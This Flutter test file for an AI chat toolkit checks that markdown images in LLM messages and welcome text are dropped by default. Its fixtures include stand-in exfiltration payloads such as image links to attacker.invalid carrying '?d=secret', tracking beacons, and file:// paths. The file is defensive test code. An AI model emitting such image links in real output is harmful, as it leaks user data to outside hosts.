// Copyright 2026 The Flutter Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

import 'package:material_ui/material_ui.dart';
import 'package:flutter_ai_toolkit/flutter_ai_toolkit.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('LlmMessageStyle.imageBuilder', () {
    test(
      'defaults to null and preserves custom builder across resolve/copyWith',
      () {
        Widget customBuilder(Uri uri, String? title, String? alt) =>
            Text(alt ?? '');

        expect(LlmMessageStyle.defaultStyle().imageBuilder, isNull);
        expect(
          LlmMessageStyle.resolve(const LlmMessageStyle()).imageBuilder,
          isNull,
        );

        final customStyle = LlmMessageStyle(imageBuilder: customBuilder);
        expect(
          LlmMessageStyle.resolve(customStyle).imageBuilder,
          same(customBuilder),
        );

        final copied = LlmMessageStyle.defaultStyle().copyWith(
          imageBuilder: customBuilder,
        );
        expect(copied.imageBuilder, same(customBuilder));
        expect(
          copied.copyWith(maxWidth: 480).imageBuilder,
          same(customBuilder),
        );
      },
    );
  });

  group('LlmMessageView markdown image handling', () {
    testWidgets(
      'drops http and https markdown images by default while rendering text and links',
      (tester) async {
        final provider = EchoProvider(
          history: [
            ChatMessage(
              origin: MessageOrigin.llm,
              text:
                  'Hello **world**! Visit [Flutter](https://flutter.dev). '
                  '![chart](http://attacker.invalid/exfil?d=secret) '
                  '![pixel](https://attacker.invalid/beacon.png)',
              attachments: const [],
            ),
          ],
        );

        await tester.pumpWidget(
          MaterialApp(
            home: Scaffold(
              body: LlmChatView(
                provider: provider,
                enableAttachments: false,
                enableVoiceNotes: false,
              ),
            ),
          ),
        );
        await tester.pump();
        await tester.pump(const Duration(milliseconds: 50));

        expect(
          find.textContaining('Hello', findRichText: true),
          findsOneWidget,
        );
        expect(
          find.textContaining('world', findRichText: true),
          findsOneWidget,
        );
        expect(
          find.textContaining('Flutter', findRichText: true),
          findsOneWidget,
        );
        expect(find.byType(Image), findsNothing);
      },
    );

    testWidgets('drops file:// and relative markdown images by default', (
      tester,
    ) async {
      final provider = EchoProvider(
        history: [
          ChatMessage(
            origin: MessageOrigin.llm,
            text:
                'Summary ready. '
                '![local](file:///tmp/secret.png) '
                '![relative](secret.png)',
            attachments: const [],
          ),
        ],
      );

      await tester.pumpWidget(
        MaterialApp(
          home: Scaffold(
            body: LlmChatView(
              provider: provider,
              enableAttachments: false,
              enableVoiceNotes: false,
            ),
          ),
        ),
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 50));

      expect(
        find.textContaining('Summary ready.', findRichText: true),
        findsOneWidget,
      );
      expect(find.byType(Image), findsNothing);
    });

    testWidgets('drops markdown images in welcomeMessage by default', (
      tester,
    ) async {
      await tester.pumpWidget(
        MaterialApp(
          home: Scaffold(
            body: LlmChatView(
              provider: EchoProvider(),
              welcomeMessage:
                  'Welcome! ![beacon](https://attacker.invalid/welcome)',
              enableAttachments: false,
              enableVoiceNotes: false,
            ),
          ),
        ),
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 50));

      expect(
        find.textContaining('Welcome!', findRichText: true),
        findsOneWidget,
      );
      expect(find.byType(Image), findsNothing);
    });

    testWidgets('uses custom LlmMessageStyle.imageBuilder when provided', (
      tester,
    ) async {
      final provider = EchoProvider(
        history: [
          ChatMessage(
            origin: MessageOrigin.llm,
            text:
                'Here is a chart: '
                '![Sales Chart](https://cdn.example.com/chart.png "Q4")',
            attachments: const [],
          ),
        ],
      );

      await tester.pumpWidget(
        MaterialApp(
          home: Scaffold(
            body: LlmChatView(
              provider: provider,
              enableAttachments: false,
              enableVoiceNotes: false,
              style: LlmChatViewStyle(
                llmMessageStyle: LlmMessageStyle(
                  imageBuilder: (uri, title, alt) =>
                      Text('CUSTOM_IMG:${uri.host}:$alt:$title'),
                ),
              ),
            ),
          ),
        ),
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 50));

      expect(
        find.text('CUSTOM_IMG:cdn.example.com:Sales Chart:Q4'),
        findsOneWidget,
      );
      expect(find.byType(Image), findsNothing);
    });
  });
}
